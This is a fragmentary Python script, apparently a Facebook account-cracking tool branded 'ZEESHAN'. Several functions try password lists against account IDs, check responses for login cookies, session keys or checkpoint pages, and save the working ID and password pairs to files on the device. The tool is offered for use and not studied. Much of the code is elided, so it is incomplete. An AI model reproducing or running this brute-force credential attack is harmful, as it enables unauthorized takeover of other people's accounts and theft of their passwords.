#ZEESHAN(SAT SHAHIN YT)(SHAHI. ALAM)
...
def menu_apikey():
  ...
  os.system(f" clear")                          
  print(f"""\x1b[1;97m                                       
B ='\x1b[1;92m_________________ _   _  ___  _   _ 
G='\x1b[1;92m(___  /  ___)  ___) | | |/ _ \| \ | |
G='\x1b[1;92m  / /| |_   \ \  | |_| | |_| |  \| |
G='\x1b[1;92m  / / |  _)   > > |  _  |  _  |     |
G='\x1b[1;92m / /__| |___ / /__| | | | | | | |\  |
B ='\x1b[1;92m/_____)_____)_____)_| |_|_| |_|_| \_|                                                                          
┌───────────────────────────────────────┐
└───────────────────────────────────────┘
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ZEESHAN1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ZEESHAN-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/ZEESHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ZEESHAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ZEESHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ZEESHAN1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [ZEESHAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ZEESHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
    ...
    'user-agent': 'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ZEESHAN-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[ZEESHAN-CP] '+idf+' | '+ps+'\033[0;97m')
